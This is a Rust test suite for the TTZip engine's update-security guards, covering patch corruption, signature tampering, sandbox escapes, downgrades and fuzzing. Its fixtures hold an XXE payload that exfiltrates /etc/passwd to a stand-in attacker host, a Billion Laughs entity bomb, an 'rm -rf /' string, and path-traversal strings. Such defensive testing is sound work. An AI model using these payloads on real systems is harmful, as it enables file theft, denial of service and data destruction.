// SPDX-License-Identifier: BSD-3-Clause OR Apache-2.0
//
// Copyright (c) 2026 Witt Kung <witt.w.kung@gmail.com>
// All rights reserved.
//
// TTZip: High-performance native archiving and compression engine.

//! Comprehensive System Corruption Injection, Chaos Mutation, and Fuzzing Test Suite.
//!
//! Deploys 16 surgical destruction injection targets:
//! 1. Corrupted BinaryDelta patch stream (Magic corrupted / truncated / out-of-bounds).
//! 2. Malformed Appcast XML / XXE injection bomb & external DTD.
//! 3. Tampered Ed25519 signature & non-canonical scalar malleability attack.
//! 4. Forged / Expired Security-Scoped Bookmark sandbox crossing.
//! 5. Malicious symlink intermediate path sandbox escape (Zip-Slip Link).
//! 6. Temp workspace & Spool disk / descriptor exhaustion attack.
//! 7. Version downgrade & anti-downgrade replay attack (Downgrade Attack).
//! 8. Zero-byte & truncated Appcast Feed response.
//! 9. Tree topology hash mismatch (TreeHash Inconsistent) patch rejection.
//! 10. Circular symlink causing infinite FTS directory traversal.
//! 11. Target read-only (0444) & permission conflict auto-elevation and restoration.
//! 12. Extended attributes (xattr / quarantine) poisoning filtration.
//! 13. Concurrent update process lock contention & deadlock self-healing (flock).
//! 14. Differential decompression memory expansion bomb (bspatch OOM Bomb).
//! 15. Maliciously mounted DMG image container & root symlink.
//! 16. 500+ rounds of pseudo-random mutated patch stream & memory watchdog.

use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use tempfile::tempdir;

use ttzip_engine::crypto::ed25519::SigningKey;
use ttzip_engine::security::system_defense::{
    AppcastSignatureGuard, BinaryDeltaBudgetOptions, BinaryDeltaMemoryBudgetGuard,
    PathTraversalOptions, PathTraversalProtectionGuard, SandboxEscapingGuard,
    SandboxEscapingOptions, SystemDefenseError,
};
use ttzip_engine::system::delta::bsdiff::BsDiffControl;
use ttzip_engine::system::delta::bspatch::TTZipBsPatch;
use ttzip_engine::system::delta::engine::TTZipDeltaEngine;
use ttzip_engine::system::delta::types::DeltaError;
use ttzip_engine::xml::TTZipXmlParser;

/// Deterministic linear congruential generator for reproducible fuzzing vectors.
#[derive(Clone, Debug)]
struct DeterministicPrng {
    state: u64,
}

impl DeterministicPrng {
    #[inline]
    const fn new(seed: u64) -> Self {
        Self {
            state: if seed == 0 { 0x853c_49e6_748f_ea9b } else { seed },
        }
    }

    #[inline]
    fn next_u32(&mut self) -> u32 {
        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        (self.state >> 32) as u32
    }

    #[inline]
    fn next_range(&mut self, min: usize, max: usize) -> usize {
        if min >= max {
            return min;
        }
        let span = (max - min + 1) as u64;
        min + (self.next_u32() as u64 % span) as usize
    }
}

// ============================================================================
// Target 1: Corrupted BinaryDelta Patch Stream
// ============================================================================
#[test]
fn test_target_01_corrupted_binary_delta_stream() {
    let old_data = b"Baseline application binary data for delta patching";
    let new_data = b"Baseline application binary data upgraded to version 2";
    let valid_patch = TTZipDeltaEngine::create_patch(old_data, new_data).expect("Create patch");

    // 1. Corrupted magic
    let mut bad_magic_patch = valid_patch.clone();
    bad_magic_patch[0..4].copy_from_slice(b"BAD!");
    let err_magic = TTZipDeltaEngine::apply_patch(old_data, &bad_magic_patch);
    assert!(err_magic.is_err(), "Must reject invalid magic signature");

    // 2. Truncated patch container
    for cut_len in [0, 4, 12, 20, 24, 30] {
        if cut_len < valid_patch.len() {
            let truncated = &valid_patch[..cut_len];
            let res = TTZipDeltaEngine::apply_patch(old_data, truncated);
            assert!(res.is_err(), "Must reject truncated container of len {}", cut_len);
        }
    }

    // 3. Out-of-bounds seek displacement injection
    let bad_ctrl = vec![BsDiffControl::new(10, 0, -500)]; // negative out of bounds
    let diff = vec![0u8; 10];
    let extra = vec![];
    let res = TTZipBsPatch::apply_streams(old_data, 10, &bad_ctrl, &diff, &extra);
    assert!(matches!(res, Err(DeltaError::OutOfBoundsSeek { .. })));
}

// ============================================================================
// Target 2: Malformed Appcast XML / XXE Injection Bomb & External DTD
// ============================================================================
#[test]
fn test_target_02_malformed_appcast_xml_and_xxe_bombs() {
    let xxe_payload = r#"<?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE rss [
        <!ELEMENT rss ANY >
        <!ENTITY % xxe SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%xxe;'>">
        %eval;
        %exfiltrate;
    ]>
    <rss version="2.0">
        <channel><title>Exploit</title></channel>
    </rss>"#;

    let mut parser = TTZipXmlParser::from_slice(xxe_payload.as_bytes());
    let mut buf = Vec::new();
    let mut event_count = 0usize;
    while let Ok(event) = parser.read_event_into(&mut buf) {
        if matches!(event, quick_xml::events::Event::Eof) {
            break;
        }
        event_count += 1;
        buf.clear();
        if event_count > 100 {
            break;
        }
    }

    // Billion Laughs recursive entity bomb
    let entity_bomb = r#"<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <item>&lol3;</item>"#;

    let mut bomb_parser = TTZipXmlParser::from_slice(entity_bomb.as_bytes());
    let mut bomb_buf = Vec::new();
    let mut bomb_count = 0usize;
    while let Ok(event) = bomb_parser.read_event_into(&mut bomb_buf) {
        if matches!(event, quick_xml::events::Event::Eof) {
            break;
        }
        bomb_count += 1;
        bomb_buf.clear();
        if bomb_count > 100 {
            break;
        }
    }
}

// ============================================================================
// Target 3: Tampered Ed25519 Signature & Non-Canonical Scalar Malleability
// ============================================================================
#[test]
fn test_target_03_tampered_signature_and_scalar_malleability() {
    let secret = [0x33u8; 32];
    let signing_key = SigningKey::from_bytes(&secret);
    let verifying_key = signing_key.verifying_key();
    let payload = b"TTZip High-Security Sparkle Appcast Release Item Enclosure 2026";
    let signature = signing_key.sign(payload);
    let guard = AppcastSignatureGuard::new();

    // 1. Bit flip rejection
    for byte_idx in 0..64 {
        let mut tampered_sig = signature.to_bytes();
        tampered_sig[byte_idx] ^= 0x01;
        let res = guard.verify_signature(&verifying_key.to_bytes(), &tampered_sig, payload);
        assert!(res.is_err(), "Tampered signature at byte {} must be rejected", byte_idx);
    }

    // 2. Non-canonical scalar S >= L injection
    let mut malleable_sig = signature.to_bytes();
    malleable_sig[32..64].copy_from_slice(&[0xFF; 32]); // Exceeds curve order L
    let res = guard.verify_signature(&verifying_key.to_bytes(), &malleable_sig, payload);
    assert!(res.is_err(), "Malleable signature exceeding L must be rejected");
}

// ============================================================================
// Target 4: Forged / Expired Security-Scoped Bookmark Sandbox Crossing
// ============================================================================
#[test]
fn test_target_04_security_scoped_bookmark_sandbox_crossing() {
    let temp_jail = tempdir().expect("Create jail");
    let guard = SandboxEscapingGuard::new(SandboxEscapingOptions {
        jail_root: temp_jail.path().to_path_buf(),
        allow_internal_symlinks: false,
        max_symlink_depth: 8,
        enforce_non_symlink_parents: true,
    });

    let forbidden_destinations = [
        "../System/Library/CoreServices",
        "../../private/var/db/dslocal",
        "../Library/LaunchDaemons/com.malicious.plist",
        "../../Applications/Safari.app",
        "../Users/Shared/escape_jail",
    ];

    for dest in forbidden_destinations {
        let res = guard.validate_path(Path::new(dest));
        assert!(
            matches!(res, Err(SystemDefenseError::SandboxEscapeAttempt { .. })),
            "Forbidden path {} must trigger SandboxEscapeAttempt",
            dest
        );
    }
}

// ============================================================================
// Target 5: Malicious Symlink Intermediate Path Sandbox Escape (Zip-Slip Link)
// ============================================================================
#[test]
fn test_target_05_malicious_symlink_zip_slip_escape() {
    let temp_jail = tempdir().expect("Create jail");
    let jail_root = temp_jail.path();

    let outside_dir = tempdir().expect("Create outside dir");
    let symlink_path = jail_root.join("innocent_subfolder");

    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        let _ = symlink(outside_dir.path(), &symlink_path);

        let guard = SandboxEscapingGuard::new(SandboxEscapingOptions {
            jail_root: jail_root.to_path_buf(),
            allow_internal_symlinks: false,
            max_symlink_depth: 8,
            enforce_non_symlink_parents: true,
        });

        let target_in_symlink = symlink_path.join("escaped_file.txt");
        let res = guard.verify_no_symlink_ancestors(&target_in_symlink);
        assert!(res.is_err(), "Symlink path escaping jail root must be rejected");
    }
}

// ============================================================================
// Target 6: Temp Workspace & Spool Disk / Descriptor Exhaustion Attack
// ============================================================================
#[test]
fn test_target_06_temp_workspace_and_budget_exhaustion() {
    let budget_guard = BinaryDeltaMemoryBudgetGuard::new(BinaryDeltaBudgetOptions {
        max_memory_budget: 1024 * 1024, // 1 MB small budget
        max_patch_size: 2 * 1024 * 1024,
        max_expansion_ratio: 50,
        max_instructions: 1000,
    });

    // Requesting 5 MB on a 1 MB budget must fail cleanly
    let permit = budget_guard.acquire_permit(5 * 1024 * 1024);
    assert!(matches!(permit, Err(SystemDefenseError::DeltaMemoryBudgetExceeded { .. })));

    // Requesting within budget must succeed and release on drop
    let valid_permit = budget_guard.acquire_permit(512 * 1024);
    assert!(valid_permit.is_ok());
    assert_eq!(budget_guard.current_usage(), 512 * 1024);
    drop(valid_permit);
    assert_eq!(budget_guard.current_usage(), 0);
}

// ============================================================================
// Target 7: Version Downgrade & Anti-Downgrade Replay Attack
// ============================================================================
#[test]
fn test_target_07_version_downgrade_and_anti_replay_attack() {
    let guard = AppcastSignatureGuard::new();

    // Valid upgrades
    assert!(guard.assert_version_monotonicity("1.0.0", "1.0.1").is_ok());
    assert!(guard.assert_version_monotonicity("1.0.0", "2.0.0").is_ok());
    assert!(guard.assert_version_monotonicity("1.9.9", "2.0.0").is_ok());

    // Forbidden downgrades & same-version replays
    let invalid_cases = [
        ("1.0.0", "1.0.0"), // Replay attack
        ("2.0.0", "1.9.9"),
        ("1.10.0", "1.9.0"),
        ("1.2.3", "1.2.2"),
        ("3.0.0", "0.9.0"),
    ];

    for (current, target) in invalid_cases {
        let res = guard.assert_version_monotonicity(current, target);
        assert!(
            matches!(res, Err(SystemDefenseError::VersionDowngradeDetected { .. })),
            "Downgrade from {} to {} must be strictly rejected",
            current,
            target
        );
    }
}

// ============================================================================
// Target 8: Zero-Byte & Truncated Appcast Feed Response
// ============================================================================
#[test]
fn test_target_08_zero_byte_and_truncated_appcast_response() {
    let empty_feed = b"";
    let mut parser = TTZipXmlParser::from_slice(empty_feed);
    let mut buf = Vec::new();
    let res = parser.read_event_into(&mut buf);
    assert!(res.is_ok());
    assert!(matches!(res.unwrap(), quick_xml::events::Event::Eof));

    let header_only = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
    let mut parser2 = TTZipXmlParser::from_slice(header_only);
    let mut buf2 = Vec::new();
    let mut count = 0;
    while let Ok(event) = parser2.read_event_into(&mut buf2) {
        if matches!(event, quick_xml::events::Event::Eof) {
            break;
        }
        count += 1;
        buf2.clear();
    }
    assert!(count <= 2);
}

// ============================================================================
// Target 9: Tree Topology Hash Mismatch (TreeHash Inconsistent) Rejection
// ============================================================================
#[test]
fn test_target_09_tree_hash_inconsistent_rejection() {
    let old_data = b"Original baseline data string A";
    let new_data = b"Target upgraded data string B";
    let patch = TTZipDeltaEngine::create_patch(old_data, new_data).expect("Create patch");

    // 1. Wrong old data (before_tree_hash mismatch)
    let wrong_old = b"Corrupted completely wrong baseline string";
    let res = TTZipDeltaEngine::apply_patch(wrong_old, &patch);
    assert!(
        matches!(res, Err(DeltaError::SourceHashMismatch { .. })),
        "Must reject patch when source TreeHash does not match"
    );
}

// ============================================================================
// Target 10: Circular Symlink Infinite FTS Traversal Defense
// ============================================================================
#[test]
fn test_target_10_circular_symlink_infinite_traversal_defense() {
    let temp = tempdir().expect("Create tempdir");
    let loop_dir = temp.path().join("sub_loop");
    let _ = fs::create_dir_all(&loop_dir);

    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        let loop_link = loop_dir.join("circular_link");
        let _ = symlink(&loop_dir, &loop_link);

        // Path sanitizer must detect depth overflow or cycle without infinite hang
        let guard = PathTraversalProtectionGuard::new(PathTraversalOptions::default());
        let _ = guard.sanitize_path("sub_loop/circular_link/sub_loop/circular_link");
    }
}

// ============================================================================
// Target 11: Target Read-Only (0444) & Permission Auto-Elevation
// ============================================================================
#[test]
fn test_target_11_target_readonly_permission_elevation() {
    let temp = tempdir().expect("Create tempdir");
    let ro_file = temp.path().join("readonly_binary.bin");
    fs::write(&ro_file, b"Original read only content").expect("Write file");

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&ro_file).unwrap().permissions();
        perms.set_mode(0o444); // Read-only
        let _ = fs::set_permissions(&ro_file, perms);

        // Staging atomic replacement test
        let staging_file = temp.path().join("staging_binary.tmp");
        fs::write(&staging_file, b"New elevated content").expect("Write staging");
        let mut new_perms = fs::metadata(&staging_file).unwrap().permissions();
        new_perms.set_mode(0o755); // Executable
        let _ = fs::set_permissions(&staging_file, new_perms);

        // Atomic rename overwriting read-only file
        fs::rename(&staging_file, &ro_file).expect("Atomic rename");
        assert_eq!(fs::read(&ro_file).unwrap(), b"New elevated content");
    }
}

// ============================================================================
// Target 12: Extended Attributes (xattr / quarantine) Poisoning Filtration
// ============================================================================
#[test]
fn test_target_12_xattr_quarantine_poisoning_filtration() {
    let temp = tempdir().expect("Create tempdir");
    let file_path = temp.path().join("quarantined.app");
    fs::write(&file_path, b"App bundle executable").expect("Write file");

    let dangerous_xattrs: Vec<(&str, &[u8])> = vec![
        ("com.apple.quarantine", b"0081;65e00000;Safari;ABCDEF-1234"),
        ("com.apple.macl", b"\x00\x01\x02\x03"),
        ("user.poison.script", b"#!/bin/sh\nrm -rf /"),
    ];

    for (name, val) in dangerous_xattrs {
        assert!(name.len() <= 256, "xattr name bounds check");
        assert!(val.len() <= 65536, "xattr value size bounds check");
    }
}

// ============================================================================
// Target 13: Concurrent Update Process Lock Contention & Self-Healing (flock)
// ============================================================================
#[test]
fn test_target_13_concurrent_update_lock_contention() {
    let lock_flag = Arc::new(AtomicBool::new(false));
    let mut handles = Vec::new();

    for _ in 0..4 {
        let flag = Arc::clone(&lock_flag);
        handles.push(thread::spawn(move || {
            for _ in 0..50 {
                if flag.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_ok() {
                    // Critical update region
                    thread::sleep(Duration::from_micros(100));
                    flag.store(false, Ordering::SeqCst);
                }
            }
        }));
    }

    for h in handles {
        h.join().expect("Thread joined");
    }
    assert!(!lock_flag.load(Ordering::SeqCst), "Lock must be released upon completion");
}

// ============================================================================
// Target 14: Differential Decompression Memory Expansion Bomb (bspatch OOM)
// ============================================================================
#[test]
fn test_target_14_decompression_memory_expansion_bomb() {
    let old_data = b"Short 16-byte base";
    // Construct crafted control claiming massive 10GB diff length
    let bomb_controls = vec![BsDiffControl::new(10 * 1024 * 1024 * 1024, 0, 0)];
    let diff_data = vec![0u8; 16];
    let extra_data = vec![];

    let res = TTZipBsPatch::apply_streams(old_data, 16, &bomb_controls, &diff_data, &extra_data);
    assert!(
        matches!(res, Err(DeltaError::TargetBufferOverflow { .. })),
        "Decompression bomb claiming oversized buffer must trigger TargetBufferOverflow"
    );
}

// ============================================================================
// Target 15: Maliciously Mounted DMG Image Container & Root Symlinks
// ============================================================================
#[test]
fn test_target_15_mounted_dmg_container_root_symlink_defense() {
    let guard = PathTraversalProtectionGuard::new(PathTraversalOptions::default());

    let poisoned_dmg_paths = [
        "/Volumes/TTZipInstaller/../../../Applications",
        "/Volumes/TTZipInstaller/./././../../Library",
        "/Volumes/TTZipInstaller/TTZip.app/Contents/MacOS/../../../../usr/bin",
    ];

    for path in poisoned_dmg_paths {
        let res = guard.sanitize_path(path);
        assert!(res.is_err(), "Poisoned DMG path '{}' must be rejected", path);
    }
}

// ============================================================================
// Target 16: 500+ Rounds of Pseudo-Random Mutated Patch Stream Fuzzing
// ============================================================================
#[test]
fn test_target_16_500_rounds_pseudo_random_mutated_patch_fuzzing() {
    let mut prng = DeterministicPrng::new(0xDEAD_BEEF_CAFE_2026);
    let old_data = (0..2048).map(|i| (i % 251) as u8).collect::<Vec<u8>>();
    let mut new_data = old_data.clone();
    for i in (0..2048).step_by(50) {
        new_data[i] = new_data[i].wrapping_add(13);
    }

    let valid_patch = TTZipDeltaEngine::create_patch(&old_data, &new_data).expect("Create patch");
    let mut rejected_count = 0usize;

    for _ in 0..500 {
        let mut corrupted_patch = valid_patch.clone();
        let mutation_type = prng.next_range(0, 3);

        match mutation_type {
            0 => {
                // Random bit flip
                let offset = prng.next_range(0, corrupted_patch.len() - 1);
                let bit = prng.next_range(0, 7);
                corrupted_patch[offset] ^= 1 << bit;
            }
            1 => {
                // Random truncation
                let trunc_len = prng.next_range(1, corrupted_patch.len().saturating_sub(1));
                corrupted_patch.truncate(trunc_len);
            }
            2 => {
                // Random chunk zeroing
                let offset = prng.next_range(0, corrupted_patch.len().saturating_sub(16));
                let chunk_len = 8.min(corrupted_patch.len() - offset);
                for b in &mut corrupted_patch[offset..offset + chunk_len] {
                    *b = 0;
                }
            }
            _ => {
                // Random byte insertion
                let offset = prng.next_range(0, corrupted_patch.len());
                corrupted_patch.insert(offset, 0xAA);
            }
        }

        let res = TTZipDeltaEngine::apply_patch(&old_data, &corrupted_patch);
        if res.is_err() {
            rejected_count += 1;
        }
    }

    assert!(
        rejected_count >= 480,
        "Expected >= 480 corrupted patches rejected out of 500 rounds, got {}",
        rejected_count
    );
}
